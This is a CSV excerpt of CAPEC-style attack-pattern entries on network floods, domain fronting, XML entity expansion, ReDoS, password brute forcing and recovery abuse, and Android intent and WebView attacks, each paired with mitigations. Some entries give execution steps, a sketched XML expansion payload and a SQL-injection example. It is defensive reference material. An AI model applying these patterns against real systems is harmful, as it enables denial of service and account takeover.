'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes
481,"Contradictory Destinations in Traffic Routing Schemes",Standard,Draft,"Adversaries can provide contradictory destinations when sending messages. Traffic is routed in networks using the domain names in various headers available at different levels of the OSI model. In a Content Delivery Network (CDN) multiple domains might be available, and if there are contradictory domain names provided it is possible to route traffic to an inappropriate destination. The technique, called Domain Fronting, involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. An alternative technique, called Domainless Fronting, is similar, but the SNI field is left blank.","",Medium,High,"::NATURE:ChildOf:CAPEC ID:161::","","::An adversary must be aware that their message will be routed using a CDN, and that both of the contradictory domains are served from that CDN.::If the purpose of the Domain Fronting is to hide redirected C2 traffic, the C2 server must have been created in the CDN.::","::SKILL:The adversary must have some knowledge of how messages are routed.:LEVEL:Medium::","","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data::","::Monitor connections, checking headers in traffic for contradictory domain names, or empty domain names.::","","::923::","TAXONOMY NAME:ATTACK:ENTRY ID:1090.004:ENTRY NAME:Proxy:Domain Fronting::","",
482,"TCP Flood",Standard,Draft,"An adversary may execute a flooding attack using the TCP protocol with the intent to deny legitimate users access to a service. These attacks exploit the weakness within the TCP protocol where there is some state information for the connection the server needs to maintain. This often involves the use of TCP SYN messages.","",,,"::NATURE:ChildOf:CAPEC ID:125::","","::This type of an attack requires the ability to generate a large amount of TCP traffic to send to the target port of a functioning server.::","","","","","::To mitigate this type of an attack, an organization can monitor incoming packets and look for patterns in the TCP traffic to determine if the network is under an attack. The potential target may implement a rate limit on TCP SYN messages which would provide limited capabilities while under attack.::","","::770::","TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service: Direct Network Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1499.001:ENTRY NAME:Endpoint Denial of Service: OS Exhaustion Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service: Service Exhaustion Flood::","",
485,"Signature Spoofing by Key Recreation",Detailed,Draft,"An attacker obtains an authoritative or reputable signer's private signature key by exploiting a cryptographic weakness in the signature algorithm or pseudorandom number generation and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.","",Low,High,"::NATURE:ChildOf:CAPEC ID:473::","","::An authoritative signer is using a weak method of random number generation or weak signing software that causes key leakage or permits key inference.::An authoritative signer is using a signature algorithm with a direct weakness or with poorly chosen parameters that enable the key to be recovered using signatures from that signer.::","::SKILL:Cryptanalysis of signature generation algorithm:LEVEL:High::SKILL:Reverse engineering and cryptanalysis of signature generation algorithm implementation and random number generation:LEVEL:High::SKILL:Ability to create malformed data blobs and know how to present them directly or indirectly to a victim.:LEVEL:High::","","","","::Ensure cryptographic elements have been sufficiently tested for weaknesses.::","","::330::","TAXONOMY NAME:ATTACK:ENTRY ID:1552.004:ENTRY NAME:Unsecure Credentials: Private Keys::","",
486,"UDP Flood",Standard,Draft,"An adversary may execute a flooding attack using the UDP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. Additionally, firewalls often open a port for each UDP connection destined for a service with an open UDP port, meaning the firewalls in essence save the connection state thus the high packet nature of a UDP flood can also overwhelm resources allocated to the firewall. UDP attacks can also target services like DNS or VoIP which utilize these protocols. Additionally, due to the session-less nature of the UDP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.","",,,"::NATURE:ChildOf:CAPEC ID:125::","","::This type of an attack requires the ability to generate a large amount of UDP traffic to send to the desired port of a target service using UDP.::","","","","","::To mitigate this type of an attack, modern firewalls drop UDP traffic destined for closed ports, and unsolicited UDP reply packets. A variety of other countermeasures such as universal reverse path forwarding and remote triggered black holing(RFC3704) along with modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.::","","::770::","","",
487,"ICMP Flood",Standard,Draft,"An adversary may execute a flooding attack using the ICMP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. A typical attack involves a victim server receiving ICMP packets at a high rate from a wide range of source addresses. Additionally, due to the session-less nature of the ICMP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.","",,,"::NATURE:ChildOf:CAPEC ID:125::","","::This type of an attack requires the ability to generate a large amount of ICMP traffic to send to the target server.::","","","","","::To mitigate this type of an attack, an organization can enable ingress filtering. Additionally modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.::","","::770::","","",
488,"HTTP Flood",Standard,Draft,"An adversary may execute a flooding attack using the HTTP protocol with the intent to deny legitimate users access to a service by consuming resources at the application layer such as web services and their infrastructure. These attacks use legitimate session-based HTTP GET requests designed to consume large amounts of a server's resources. Since these are legitimate sessions this attack is very difficult to detect.","",,,"::NATURE:ChildOf:CAPEC ID:125::","","::This type of an attack requires the ability to generate a large amount of HTTP traffic to send to a target server.::","","","","","::Design: Use a Web Application Firewall (WAF) to help filter out malicious traffic. This can be setup with rules to block IP addresses found in IP reputation databases, which contains lists of known bad IP addresses. Analysts should also monitor when the traffic flow becomes abnormally large, and be able to add on-the-fly rules to block malicious traffic. Special care should be taken to ensure low false positive rates in block rules and functionality should be implemented to allow a legitimate user to resume sending traffic if they have been blocked.::Hire a third party provider to implement a Web Application Firewall (WAF) for your application. Third party providers have dedicated resources and expertise that could allow them to update rules and prevent HTTP Floods very quickly.::Design: Use a load balancer such as nginx to prevent small scale HTTP Floods by dispersing traffic between a group of servers.::Implementation: Make a requesting machine solve some kind of challenge before allowing them to send an HTTP request. This could be a captcha or something similar that works to deter bots.::","","::770::","TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service:Service Exhaustion Flood::","",
489,"SSL Flood",Standard,Draft,"An adversary may execute a flooding attack using the SSL protocol with the intent to deny legitimate users access to a service by consuming all the available resources on the server side. These attacks take advantage of the asymmetric relationship between the processing power used by the client and the processing power used by the server to create a secure connection. In this manner the attacker can make a large number of HTTPS requests on a low provisioned machine to tie up a disproportionately large number of resources on the server. The clients then continue to keep renegotiating the SSL connection. When multiplied by a large number of attacking machines, this attack can result in a crash or loss of service to legitimate users.","",,,"::NATURE:ChildOf:CAPEC ID:125::","","::This type of an attack requires the ability to generate a large amount of SSL traffic to send a target server.::","","","","","::To mitigate this type of an attack, an organization can create rule based filters to silently drop connections if too many are attempted in a certain time period.::","","::770::","TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service:Service Exhaustion Flood::","",
49,"Password Brute Forcing",Standard,Draft,"An adversary tries every possible value for a password until they succeed. A brute force attack, if feasible computationally, will always be successful because it will essentially go through all possible passwords given the alphabet used (lower case letters, upper case letters, numbers, symbols, etc.) and the maximum length of the password.","",Medium,High,"::NATURE:ChildOf:CAPEC ID:112::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::","::STEP:1:PHASE:Explore:DESCRIPTION:[Determine application's/system's password policy] Determine the password policies of the target application/system.:TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Exploit:DESCRIPTION:[Brute force password] Given the finite space of possible passwords dictated by the password policy determined in the previous step, try all possible passwords for a known user ID until application/system grants access.:TECHNIQUE:Manually or automatically enter all possible passwords through the application/system's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.:TECHNIQUE:Perform an offline dictionary attack or a rainbow table attack against a known password hash.::","::An adversary needs to know a username to target.::The system uses password based authentication as the one factor authentication mechanism.::An application does not have a password throttling mechanism in place. A good password throttling mechanism will make it almost impossible computationally to brute force a password as it may either lock out the user after a certain number of incorrect attempts or introduce time out periods. Both of these would make a brute force attack impractical.::","::SKILL:A brute force attack is very straightforward. A variety of password cracking tools are widely available.:LEVEL:Low::","::A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).::","::Many incorrect login attempts are detected by the system.::","::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::","::Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.::Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.::Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen.::","::A system does not enforce a strong password policy and the user picks a five letter password consisting of lower case English letters only. The system does not implement any password throttling mechanism. Assuming the adversary does not know the length of the users' password, an adversary can brute force this password in maximum 1+26+26^2+26^3+26^4+26^5 = 1 + 26 + 676 + 17576 + 456976 + 11,881,376 = 12,356,631 attempts, and half these tries (6,178,316) on average. Using modern hardware this attack is trivial. If the adversary were to assume that the user password could also contain upper case letters (and it was case sensitive) and/or numbers, than the number of trials would have been larger. An adversary's job would have most likely been even easier because many users who choose easy to brute force passwords like this are also likely to use a word that can be found in the dictionary. Since there are far fewer valid English words containing up to five letters than 12,356,631, an attack that tries each of the entries in the English dictionary would go even faster.::A weakness exists in the automatic password generation routine of Mailman prior to 2.1.5 that causes only about five million different passwords to be generated. This makes it easy to brute force the password for all users who decided to let Mailman automatically generate their passwords for them. Users who chose their own passwords during the sign up process would not have been affected (assuming that they chose strong passwords). See also: CVE-2004-1143::","::521::262::263::257::654::307::308::309::","TAXONOMY NAME:ATTACK:ENTRY ID:1110.001:ENTRY NAME:Brute Force:Password Guessing::","",
490,"Amplification",Standard,Draft,"An adversary may execute an amplification where the size of a response is far greater than that of the request that generates it. The goal of this attack is to use a relatively few resources to create a large amount of traffic against a target server. To execute this attack, an adversary send a request to a 3rd party service, spoofing the source address to be that of the target server. The larger response that is generated by the 3rd party service is then sent to the target server. By sending a large number of initial requests, the adversary can generate a tremendous amount of traffic directed at the target. The greater the discrepancy in size between the initial request and the final payload delivered to the target increased the effectiveness of this attack.","",,,"::NATURE:ChildOf:CAPEC ID:125::","","::This type of an attack requires the existence of a 3rd party service that generates a response that is significantly larger than the request that triggers it.::","","","","","::To mitigate this type of an attack, an organization can attempt to identify the 3rd party services being used in an active attack and blocking them until the attack ends. This can be accomplished by filtering traffic for suspicious message patterns such as a spike in traffic where each response contains the same large block of data. Care should be taken to prevent false positive rates so legitimate traffic isn't blocked.::","","::770::","TAXONOMY NAME:ATTACK:ENTRY ID:1498.002:ENTRY NAME:Network Denial of Service:Reflection Amplification::","",
491,"Quadratic Data Expansion",Detailed,Draft,"An adversary exploits macro-like substitution to cause a denial of service situation due to excessive memory being allocated to fully expand the data. The result of this denial of service could cause the application to freeze or crash. This involves defining a very large entity and using it multiple times in a single entity substitution. CAPEC-197 is a similar attack pattern, but it is easier to discover and defend against. This attack pattern does not perform multi-level substitution and therefore does not obviously appear to consume extensive resources.","::TERM:XML Entity Expansion (XEE):DESCRIPTION:::",,,"::NATURE:ChildOf:CAPEC ID:230::","::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] An adversary determines the input data stream that is being processed by a data parser that supports using substituion on the victim's side.:TECHNIQUE:Use an automated tool to record all instances of URLs to process requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes requests.::STEP:2:PHASE:Exploit:DESCRIPTION:[Craft malicious payload] The adversary crafts malicious message containing nested quadratic expansion that completely uses up available server resource.::STEP:3:PHASE:Exploit:DESCRIPTION:[Send the message] Send the malicious crafted message to the target URL.::","::This type of attack requires a server that accepts serialization data which supports substitution and parses the data.::","","","","::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::","::Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion.::Implementation: For XML based data - disable altogether the use of inline DTD schemas when parsing XML objects. If a DTD must be used, normalize, filter and use an allowlist and parse with methods and routines that will detect entity expansion from untrusted sources.::","::In this example the attacker defines one large entity and refers to it many times. <?xml version=1.0?><!DOCTYPE bomb [<!ENTITY x AAAAA... [100K of them] ...AAAA>]><b><c>&x;&x;... [100K of them]...&x;&x;</c></b> This results in a relatively small message of 100KBs that will expand to a message in the GB range.::","::770::","","",
492,"Regular Expression Exponential Blowup",Standard,Draft,"An adversary may execute an attack on a program that uses a poor Regular Expression(Regex) implementation by choosing input that results in an extreme situation for the Regex. A typical extreme situation operates at exponential time compared to the input size. This is due to most implementations using a Nondeterministic Finite Automaton(NFA) state machine to be built by the Regex algorithm since NFA allows backtracking and thus more complex regular expressions.","",,,"::NATURE:ChildOf:CAPEC ID:130::","","::This type of an attack requires the ability to identify hosts running a poorly implemented Regex, and the ability to send crafted input to exploit the regular expression.::","","","","","::Test custom written Regex with fuzzing to determine if the Regex is a poor one. Add timeouts to processes that handle the Regex logic. If an evil Regex is found rewrite it as a good Regex.::","","::400::1333::","TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Regular expression Denial of Service - ReDoS::","",
493,"SOAP Array Blowup",Standard,Draft,"An adversary may execute an attack on a web service that uses SOAP messages in communication. By sending a very large SOAP array declaration to the web service, the attacker forces the web service to allocate space for the array elements before they are parsed by the XML parser. The attacker message is typically small in size containing a large array declaration of say 1,000,000 elements and a couple of array elements. This attack targets exhaustion of the memory resources of the web service.","",,,"::NATURE:ChildOf:CAPEC ID:130::","","::This type of an attack requires the attacker to know the endpoint of the web service, and be able to reach the endpoint with a malicious SOAP message.::","","","","","::Enforce strict schema validation. The schema should enforce a maximum number of array elements. If the number of maximum array elements can't be limited another validation method should be used. One such method could be comparing the declared number of items in the array with the existing number of elements of the array. If these numbers don't match drop the SOAP packet at the web service layer.::","","::770::","","",
494,"TCP Fragmentation",Standard,Draft,"An adversary may execute a TCP Fragmentation attack against a target with the intention of avoiding filtering rules of network controls, by attempting to fragment the TCP packet such that the headers flag field is pushed into the second fragment which typically is not filtered.","",,,"::NATURE:ChildOf:CAPEC ID:130::","","::This type of an attack requires the target system to be running a vulnerable implementation of IP, and the adversary needs to ability to send TCP packets of arbitrary size with crafted data.::","","","","","::This attack may be mitigated by enforcing rules at the router following the guidance of RFC1858. The essential part of the guidance is creating the following rule IF FO=1 and PROTOCOL=TCP then DROP PACKET as this mitigated both tiny fragment and overlapping fragment attacks in IPv4. In IPv6 overlapping(RFC5722) additional steps may be required such as deep packet inspection. The delayed fragments may be mitigated by enforcing a timeout on the transmission to receive all packets by a certain time since the first packet is received. According to RFC2460 IPv6 implementations should enforce a rule to discard all fragments if the fragments are not ALL received within 60 seconds of the FIRST arriving fragment.::","","::770::404::","","",
495,"UDP Fragmentation",Standard,Draft,"An attacker may execute a UDP Fragmentation attack against a target server in an attempt to consume resources such as bandwidth and CPU. IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. Typically the attacker will use large UDP packets over 1500 bytes of data which forces fragmentation as ethernet MTU is 1500 bytes. This attack is a variation on a typical UDP flood but it enables more network bandwidth to be consumed with fewer packets. Additionally it has the potential to consume server CPU resources and fill memory buffers associated with the processing and reassembling of fragmented packets.","",,,"::NATURE:ChildOf:CAPEC ID:130::","","::This type of an attack requires the attacker to be able to generate fragmented IP traffic containing crafted data.::","","","","","::This attack may be mitigated by changing default cache sizes to be larger at the OS level. Additionally rules can be enforced to prune the cache with shorter timeouts for packet reassembly as the cache nears capacity.::","","::770::404::","","",
496,"ICMP Fragmentation",Standard,Draft,"An attacker may execute a ICMP Fragmentation attack against a target with the intention of consuming resources or causing a crash. The attacker crafts a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message. The attacker these sends these messages to a target host which causes the host to become non-responsive. Another vector may be sending a fragmented ICMP message to a target host with incorrect sizes in the header which causes the host to hang.","",,,"::NATURE:ChildOf:CAPEC ID:130::","","::This type of an attack requires the target system to be running a vulnerable implementation of IP, and the attacker needs to ability to send arbitrary sized ICMP packets to the target.::","","","","","::This attack may be mitigated through egress filtering based on ICMP payload so a network is a good neighbor to other networks. Bad IP implementations become patched, so using the proper version of a browser or OS is recommended.::","","::770::404::","","",
497,"File Discovery",Standard,Draft,"An adversary engages in probing and exploration activities to determine if common key files exists. Such files often contain configuration and security parameters of the targeted application, system or network. Using this knowledge may often pave the way for more damaging attacks.","",High,Very Low,"::NATURE:ChildOf:CAPEC ID:169::","","::The adversary must know the location of these common key files.::","","","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::","::Leverage file protection mechanisms to render these files accessible only to authorized parties.::","","::200::","TAXONOMY NAME:ATTACK:ENTRY ID:1083:ENTRY NAME:File and Directory Discovery::","",
498,"Probe iOS Screenshots",Detailed,Draft,"An adversary examines screenshot images created by iOS in an attempt to obtain sensitive information. This attack targets temporary screenshots created by the underlying OS while the application remains open in the background.","",,,"::NATURE:ChildOf:CAPEC ID:545::","","::This type of an attack requires physical access to a device to either excavate the image files (potentially by leveraging a Jailbreak) or view the screenshots through the multitasking switcher (by double tapping the home button on the device).::","","","","","::To mitigate this type of an attack, an application that may display sensitive information should clear the screen contents before a screenshot is taken. This can be accomplished by setting the key window's hidden property to YES. This code to hide the contents should be placed in both the applicationWillResignActive() and applicationDidEnterBackground() methods.::","","::359::","","",
499,"Android Intent Intercept",Standard,Draft,"An adversary, through a previously installed malicious application, intercepts messages from a trusted Android-based application in an attempt to achieve a variety of different objectives including denial of service, information disclosure, and data injection. An implicit intent sent from a trusted application can be received by any application that has declared an appropriate intent filter. If the intent is not protected by a permission that the malicious application lacks, then the attacker can gain access to the data contained within the intent. Further, the intent can be either blocked from reaching the intended destination, or modified and potentially forwarded along.","",,,"::NATURE:ChildOf:CAPEC ID:117::","::STEP:1:PHASE:Explore:DESCRIPTION:[Find an android application that uses implicit intents] Since this attack only works on android applications that use implicit intents, rather than explicit intents, an adversary must first identify an app that uses implicit intents. They must also determine what the contents of the intents being sent are such that a malicious application can get sent these intents.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create a malicious app] The adversary must create a malicious android app meant to intercept implicit intents from a target application:TECHNIQUE:Specify the type of intent wished to be intercepted in the malicious app's manifest file using an intent filter::STEP:3:PHASE:Experiment:DESCRIPTION:[Get user to download malicious app] The adversary must get a user using the targeted app to download the malicious app by any means necessary::STEP:4:PHASE:Exploit:DESCRIPTION:[Intercept Implicit Intents] Once the malicious app is downloaded, the android device will forward any implicit intents from the target application to the malicious application, allowing the adversary to gaina access to the contents of the intent. The adversary can proceed with any attack using the contents of the intent.:TECHNIQUE:Block the intent from reaching the desired location, causing a denial of service:TECHNIQUE:Gather sensitive information from the intercepted intent:TECHNIQUE:Modify the contents of the intent and forward along to another application::","::An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application is used to intercept implicit intents.::","","","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::","::To mitigate this type of an attack, explicit intents should be used whenever sensitive data is being sent. An explicit intent is delivered to a specific application as declared within the intent, whereas the Android operating system determines who receives an implicit intent which could potentially be a malicious application. If an implicit intent must be used, then it should be assumed that the intent will be received by an unknown application and any response should be treated accordingly. Implicit intents should never be used for inter-application communication.::","","::925::","","",
5,"Blue Boxing",Detailed,Obsolete,"This type of attack against older telephone switches and trunks has been around for decades. A tone is sent by an adversary to impersonate a supervisor signal which has the effect of rerouting or usurping command of the line. While the US infrastructure proper may not contain widespread vulnerabilities to this type of attack, many companies are connected globally through call centers and business process outsourcing. These international systems may be operated in countries which have not upgraded Telco infrastructure and so are vulnerable to Blue boxing. Blue boxing is a result of failure on the part of the system to enforce strong authorization for administrative functions. While the infrastructure is different than standard current applications like web applications, there are historical lessons to be learned to upgrade the access control for administrative functions. This attack pattern is included in CAPEC for historical purposes.","",Medium,Very High,"::NATURE:ChildOf:CAPEC ID:220::","","::System must use weak authentication mechanisms for administrative functions.::","::SKILL:Given a vulnerable phone system, the attackers' technical vector relies on attacks that are well documented in cracker 'zines and have been around for decades.:LEVEL:Low::","::CCITT-5 or other vulnerable lines, with the ability to send tones such as combined 2,400 Hz and 2,600 Hz tones to the switch::","","::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::","::Implementation: Upgrade phone lines. Note this may be prohibitively expensive::Use strong access control such as two factor access control for administrative access to the switch::","::An adversary identifies a vulnerable CCITT-5 phone line, and sends a combination tone to the switch in order to request administrative access. Based on tone and timing parameters the request is verified for access to the switch. Once the adversary has gained control of the switch launching calls, routing calls, and a whole host of opportunities are available.::","::285::","","",
50,"Password Recovery Exploitation",Standard,Draft,"An attacker may take advantage of the application feature to help users recover their forgotten passwords in order to gain access into the system with the same privileges as the original user. Generally password recovery schemes tend to be weak and insecure.","",Medium,High,"::NATURE:ChildOf:CAPEC ID:212::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::","::STEP:1:PHASE:Explore:DESCRIPTION:Understand the password recovery mechanism and how it works.::STEP:2:PHASE:Exploit:DESCRIPTION:Find a weakness in the password recovery mechanism and exploit it. For instance, a weakness may be that a standard single security question is used with an easy to determine answer.::","::The system allows users to recover their passwords and gain access back into the system.::Password recovery mechanism has been designed or implemented insecurely.::Password recovery mechanism relies only on something the user knows and not something the user has.::No third party intervention is required to use the password recovery mechanism.::","::SKILL:Brute force attack:LEVEL:Low::SKILL:Social engineering and more sophisticated technical attacks.:LEVEL:Medium::","::For a brute force attack one would need a machine with sufficient CPU, RAM and HD.::","::Many incorrect attempts to answer the security question.::","::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::","::Use multiple security questions (e.g. have three and make the user answer two of them correctly). Let the user select their own security questions or provide them with choices of questions that are not generic.::E-mail the temporary password to the registered e-mail address of the user rather than letting the user reset the password online.::Ensure that your password recovery functionality is not vulnerable to an injection style attack.::","::An attacker clicks on the forgot password and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.::phpBanner Exchange is a PHP script (using the mySQL database) that facilitates the running of a banner exchange without extensive knowledge of PHP or mySQL. A SQL injection was discovered in the password recovery module of the system that allows recovering an arbitrary user's password and taking over their account. The problem is due to faulty input sanitization in the phpBannerExchange, specifically the e-mail address of the user which is requested by the password recovery module. The e-mail address requested by the password recovery module on the resetpw.php page. That e-mail address is validated with the following regular expression: if(!eregi(^[_a-z0-9-]+(.[_a-z0-9-]+)*@[a-z0-9-]+(.[a-z0-9-]+)*(.[a-z]{2,3})$, $email)){ A bug in the implementation of eregi() allows to pass additional character using a null byte 0. Since eregi() is implemented in C, the variable $email is treated as a zero-terminated string. All characters following the Null Byte will not be recognized by the regular expression. So an e-mail address can be provided that includes the special character ' to break the SQL query below (and it will not be rejected by the regular expression because of the null byte trick). So a SQL injection becomes possible: $get_info=mysql_query(select * from banneruser whereemail='$email' ); This query will return a non-zero result set even though the email supplied (attacker's email) is not in the database. Then a new password for the user is generated and sent to the $email address, an e-mail address controlled by the attacker. An attacker can then log in into the system.See also: CVE-2006-3013::","::522::640::","","",
500,"WebView Injection",Detailed,Draft,"An adversary, through a previously installed malicious application, injects code into the context of a web page displayed by a WebView component. Through the injected code, an adversary is able to manipulate the DOM tree and cookies of the page, expose sensitive information, and can launch attacks against the web application from within the web page.","",,,"::NATURE:ChildOf:CAPEC ID:253::","::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target web application] An adversary first needs to determine what web application they wish to target.:TECHNIQUE:Target web applications that require users to enter sensitive information.:TECHNIQUE:Target web applications that an adversary wishes to operate on behalf of a logged in user.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create malicious application] An adversary creates an application, often mobile, that incorporates a WebView component to display the targeted web application. This malicious application needs to downloaded by a user, so adversaries will make this application useful in some way.:TECHNIQUE:Create a 3rd party application that adds useful functionality to the targeted web application. Victims will download the application as a means of using the targeted web application.:TECHNIQUE:Create a fun game that at some point directs a user to the targeted web application. For example, prompt the user to buy in game currency by directing them to PayPal.::STEP:3:PHASE:Experiment:DESCRIPTION:[Get the victim to download and run the application] An adversary needs to get the victim to willingly download and run the application.:TECHNIQUE:Pay for App Store advertisements:TECHNIQUE:Promote the application on social media, either through accounts made by the adversary or by paying for other accounts to advertise.::STEP:4:PHASE:Exploit:DESCRIPTION:[Inject malicious code] Once the victim runs the malicious application and views the targeted web page in the WebView component, the malicious application will inject malicious JavaScript code into the web application. This is done by using WebView's loadURL() API, which can inject arbitrary JavaScript code into pages loaded by the WebView component with the same privileges. This is often done by adding a script tag to the document body with a src destination to a remote location that serves malicious JavaScript code.:TECHNIQUE:Execute operations on the targeted web page on behalf of an authenticated user.:TECHNIQUE:Steal cookie information from the victim.:TECHNIQUE:Add in extra fields to the DOM in an attempt to get a user to divulge sensitive information.::","::An adversary must be able install a purpose built malicious application onto the device and convince the user to execute it. The malicious application is designed to target a specific web application and is used to load the target web pages via the WebView component. For example, an adversary may develop an application that interacts with Facebook via WebView and adds a new feature that a user desires. The user would install this 3rd party app instead of the Facebook app.::","","","","","::The only known mitigation to this type of attack is to keep the malicious application off the system. There is nothing that can be done to the target application to protect itself from a malicious application that has been installed and executed.::","","::749::940::","","",
501,"Android Activity Hijack",Detailed,Draft,"An adversary intercepts an implicit intent sent to launch a Android-based trusted activity and instead launches a counterfeit activity in its place. The malicious activity is then used to mimic the trusted activity's user interface and prompt the target to enter sensitive data as if they were interacting with the trusted activity.","",,Medium,"::NATURE:ChildOf:CAPEC ID:499::NATURE:ChildOf:CAPEC ID:173::","::STEP:1:PHASE:Explore:DESCRIPTION:[Find an android application that uses implicit intents] Since this attack only works on android applications that use implicit intents, rather than explicit intents, an adversary must first identify an app that uses implicit intents to launch an Android-based trusted activity, and what that activity is.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create a malicious app] The adversary must create a malicious android app meant to intercept implicit intents to launch an Adroid-based trusted activity. This malicious app will mimic the trusted activiy's user interface to get the user to enter sensitive data.:TECHNIQUE:Specify the type of intent wished to be intercepted in the malicious app's manifest file using an intent filter::STEP:3:PHASE:Experiment:DESCRIPTION:[Get user to download malicious app] The adversary must get a user using the targeted app to download the malicious app by any means necessary::STEP:4:PHASE:Exploit:DESCRIPTION:[Gather sensitive data through malicious app] Once the target application sends an implicit intent to launch a trusted activity, the malicious app will be launched instead that looks identical to the interface of that activity. When the user enters sensitive information it will be captured by the malicious app.:TECHNIQUE:Gather login information from a user using a malicious app::","::The adversary must have previously installed the malicious application onto the Android device that will run in place of the trusted activity.::","::SKILL:The adversary must typically overcome network and host defenses in order to place malware on the system.:LEVEL:High::","::Malware capable of acting on the adversary's objectives.::","","::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::","::To mitigate this type of an attack, explicit intents should be used whenever sensitive data is being sent. An 'explicit intent' is delivered to a specific application as declared within the intent, whereas an 'implicit intent' is directed to an application as defined by the Android operating system. If an implicit intent must be used, then it should be assumed that the intent will be received by an unknown application and any response should be treated accordingly (i.e., with appropriate security controls).::Never use implicit intents for inter-application communication.::","","::923::","","",
502,"Intent Spoof",Standard,Draft,"An adversary, through a previously installed malicious application, issues an intent directed toward a specific trusted application's component in an attempt to achieve a variety of different objectives including modification of data, information disclosure, and data injection. Components that have been unintentionally exported and made public are subject to this type of an attack. If the component trusts the intent's action without verififcation, then the target application performs the functionality at the adversary's request, helping the adversary achieve the desired negative technical impact.","",,,"::NATURE:ChildOf:CAPEC ID:148::","","::An adversary must be able install a purpose built malicious application onto the Android device and convince the user to execute it. The malicious application will be used to issue spoofed intents.::","","","","","::To limit one's exposure to this type of attack, developers should avoid exporting components unless the component is specifically designed to handle requests from untrusted applications. Developers should be aware that declaring an intent filter will automatically export the component, exposing it to public access. Critical, state-changing actions should not be placed in exported components. If a single component handles both inter- and intra-application requests, the developer should consider dividing that component into separate components. If a component must be exported (e.g., to receive system broadcasts), then the component should dynamically check the caller's identity prior to performing any operations. Requiring Signature or SignatureOrSystem permissions is an effective way of limiting a component's exposure to a set of trusted applications. Finally, the return values of exported components can also leak private data, so developers should check the caller's identity prior to returning sensitive values.::","","::284::","","",
503,"WebView Exposure",Standard,Draft,"An adversary, through a malicious web page, accesses application specific functionality by leveraging interfaces registered through WebView's addJavascriptInterface API. Once an interface is registered to WebView through addJavascriptInterface, it becomes global and all pages loaded in the WebView can call this interface.","",,,"::NATURE:ChildOf:CAPEC ID:122::","","::This type of an attack requires the adversary to convince the user to load the malicious web page inside the target application. Once loaded, the malicious web page will have the same permissions as the target application and will have access to all registered interfaces. Both the permission and the interface must be in place for the functionality to be exposed.::","","","","","::To mitigate this type of an attack, an application should limit permissions to only those required and should verify the origin of all web content it loads.::","","::284::","","",
